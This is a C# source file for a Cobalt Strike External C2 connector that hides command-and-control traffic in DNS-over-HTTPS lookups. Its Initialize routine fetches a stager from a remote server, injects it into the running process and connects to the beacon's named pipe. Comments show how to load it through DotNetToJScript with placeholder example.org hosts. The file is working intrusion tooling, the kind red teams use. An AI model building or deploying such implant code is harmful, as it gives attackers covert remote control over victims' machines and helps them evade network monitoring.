using System;
using System.Runtime.InteropServices;
using ExternalC2.Channels;
using ExternalC2.Connectors;
using ExternalC2.Interfaces;

namespace ExternalC2
{
    /// <summary>
    ///     Socket C2 Connector to integrate with Cobalt Strike External C2
    ///     Class is ComVisble for DotNetToJScript compatibility
    ///     To use with JScript:
    ///     o.Configure('send.example.org','receive.example.org','doh-provider.example.org');
    ///     o.Go()
    /// </summary>
    [ComVisible(true)]
    public class DoHC2 : BeaconConnector, IC2Connector
    {
        /// <summary>
        ///     Create a DoH channel with the send hostname, receive hostname and DoH provider
        /// </summary>
        /// <param name="ipAddr"></param>
        /// <param name="port"></param>
        public DoHC2(string sendHost, string receiveHost, string resolver)
            : base(new DoHChannel(sendHost, receiveHost, resolver))
        {
            PipeName = Guid.NewGuid();
            sHost = sendHost;
            rHost = receiveHost;
            dResolver = resolver;
        }

        public DoHC2()
        {
        }

        // Convenient casts for use in Initialize()
        private DoHChannel Server => (DoHChannel)ServerChannel;
        private BeaconChannel Beacon => (BeaconChannel)BeaconChannel;

        /// <summary>
        ///     A unique identifier for the connection and beacon's named pipe
        /// </summary>
        public Guid PipeName { get; private set; }

        /// <summary>
        ///     DoH params
        /// </summary>
        public string sHost { get; private set; }
        public string rHost { get; private set; }
        public string dResolver { get; private set; }

        /// <summary>
        ///     The main initiliazation function responsible for:
        ///     1. Connecting to the ServerChannel (External C2 socket server)
        ///     2. Retreiving the stager from the ServerChannel
        ///     3. Injecting the stager into the current process
        ///     4. Connecting to the pipe created by the injected stager
        /// </summary>
        public override Func<bool> Initialize => () =>
        {
            Console.WriteLine("[-] Connecting to External C2 Socket");
            if (!Server.Connect()) return false;

            Console.WriteLine("[-] Grabbing stager bytes");
            var stager = Server.GetStager(PipeName.ToString(), Is64Bit);

            Console.WriteLine("[-] Creating new stager thread");
            if (InjectStager(stager) == 0) return false;
            Console.WriteLine("[+] Stager thread created!");

            Console.WriteLine($"[-] Connecting to pipe {PipeName}");
            Beacon.SetPipeName(PipeName);
            if (!Beacon.Connect()) return false;
            Console.WriteLine("[+] Connected to pipe. C2 initialization complete!");

            return true;
        };

        /// <summary>
        ///     Configuration function for DotNetToJScript and Unit Tests
        ///     To use with JScript:
        ///     o.Configure('send.example.org','receive.example.org','https://doh-provider.example.org/resolve');
        ///     o.Go()
        /// </summary>
        /// <param name="ipAddr"></param>
        /// <param name="port"></param>
        public void Configure(string sendHost, string receiveHost, string resolver)
        {
            sHost = sendHost;
            rHost = receiveHost;
            dResolver = resolver;
            PipeName = Guid.NewGuid();
            BeaconChannel = new BeaconChannel(PipeName);
            ServerChannel = new DoHChannel(sHost,rHost,dResolver);
        }
    }
}
